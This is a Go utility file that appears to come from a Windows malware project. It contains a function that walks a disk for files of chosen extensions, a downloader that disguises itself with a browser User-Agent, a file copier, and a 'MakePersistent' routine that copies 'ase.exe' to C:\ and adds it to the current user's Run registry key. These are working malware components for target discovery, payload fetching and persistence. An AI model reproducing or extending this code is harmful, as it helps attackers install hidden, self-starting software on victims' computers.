package utils

import (
	"fmt"
	"io"
	"io/fs"
	"log"
	"net/http"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// DiscoverDisk is a function that returns a list of files with the given extensions
func DiscoverDisk(path string, extensionList []string) ([]string, error) {
	var files []string
	err := filepath.WalkDir(path, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		for _, ext := range extensionList {
			if filepath.Ext(path) == "."+ext {
				files = append(files, path)
				break
			}
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func DownloadFile(filepath string, url string) (err error) {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Create a new request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	// Set the User Agent to mimic a browser
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")

	// Get the data
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

// CopyFile copie un fichier d'une source Ã  une destination
func CopyFile(source string, destination string) error {
	// Open the source file in read-only mode
	srcFile, err := os.Open(source)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	// Create the destination file with the same permissions as the source file
	srcInfo, err := srcFile.Stat()
	if err != nil {
		return err
	}
	destFile, err := os.OpenFile(destination, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, srcInfo.Mode())
	if err != nil {
		return err
	}
	defer destFile.Close()

	// Copy the file
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return err
	}

	// Make sure the contents are flushed to disk
	err = destFile.Sync()
	if err != nil {
		return err
	}

	return nil
}

func MakePersistent() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	var exPath string = filepath.Dir(ex)

	err = CopyFile(exPath+"\\ase.exe", "C:\\ase.exe")
	if err != nil {
		log.Fatal(err)
	}

	err = k.SetStringValue("ase.exe", `C:\ase.exe`)
	if err != nil {
		log.Fatal(err)
	}

	return nil
}
